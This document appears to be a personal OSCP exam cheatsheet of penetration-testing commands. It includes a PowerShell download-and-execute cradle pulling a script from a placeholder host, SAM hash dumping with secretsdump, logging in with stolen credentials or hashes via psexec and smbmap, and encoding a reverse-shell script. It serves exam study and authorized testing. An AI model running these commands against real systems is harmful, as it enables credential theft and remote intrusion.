# oscp-cheatsheet

## Kali General

- Listen for pings to test if you remote command worked
  - tcpdump -i interface icmp
- Download all files from an ftp service
  - wget -m --no-passive ftp://anonymous:anonymous@ipaddress
- Useful tools
  - xclip

## Windows

- Resources
  - [Path Traversal](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)

- Privesc
  - Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
    - IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/script.ps1")
  - Run cmd as other user
    - $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred
  - Decrypy SAM password hashes
    - impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local
  - Determine admin accounts
    - DOS: net localgroup administrators
  - SAM and SYSTEM file location
    - Windows/System32/config
  - Log into remote windows host with stolen creds (SMB required)
    - psexec.py user@ip
  - Check panther directory, install logs get put in here and contain creds

- SMB
  - Connect with stolen hash
    - smbmap -u USER -p HASH -H hostnameIP

## Linux

- Resources
  - [Path Traversal](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/)

## Troubleshooting

    - Did an RCE test work but your payload fail?
      - Try changing single quotes to double quotes or vice versa
      - Try escaping special characters
      - Try changing your outgoing port to a more commonly used one (80, 443, 21, 22, etc)
      - Try removing bad characters
        - ex: cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
          - powsershell-enc base64scriptpaste
      - If you used msfvenom make sure your archicitecture is correct
      - If you used msfvenom make sure your payload size isn't too large
      - If you used msfvenom try pivoting options
  